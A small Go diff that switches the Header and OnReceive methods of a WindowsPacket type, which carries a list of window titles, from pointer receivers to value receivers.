@@ -9,7 +9,7 @@ type WindowsPacket struct {
 	Titles []string `send`
 }
 
-func (packet *WindowsPacket) Header() common.PacketHeader {
+func (packet WindowsPacket) Header() common.PacketHeader {
 	return common.WindowsHeader
 }
 
@@ -21,7 +21,7 @@ func (packet *WindowsPacket) Init() {
 	}
 }
 
-func (packet *WindowsPacket) OnReceive() error {
+func (packet WindowsPacket) OnReceive() error {
 	Queue <- WindowsPacket{}
 
 	return nil
